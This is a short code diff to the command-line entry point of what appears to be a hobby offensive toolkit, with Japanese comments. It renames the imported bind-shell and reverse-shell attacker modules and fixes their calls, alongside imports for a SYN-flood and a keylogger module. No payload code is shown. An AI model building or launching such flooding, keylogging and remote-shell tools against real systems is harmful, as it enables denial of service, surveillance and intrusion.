@@ -3,8 +3,8 @@ import sys
 #sys.dont_write_bytecode = True
 from dos import syn_flood
 from keylogger import keylogger
-from bindshell import attacker
-from reverseshell import attacker
+from bindshell import bs_attacker
+from reverseshell import rs_attacker
 import argparse
    
 def main():
@@ -35,10 +35,10 @@ def main():
     # サブコマンドが rs-client の場合(reverceshell)
     elif args.subcommand == 'bs-connect':
         # client 要求
-        attacker.attacker(args.target)
+        bs_attacker.attacker(args.target)
     elif args.subcommand == 'rs-connect':
-        attacker.attacker()
-            
+        rs_attacker.attacker()
+        
     # キーロガー
     #keylogger.keylogger()
     
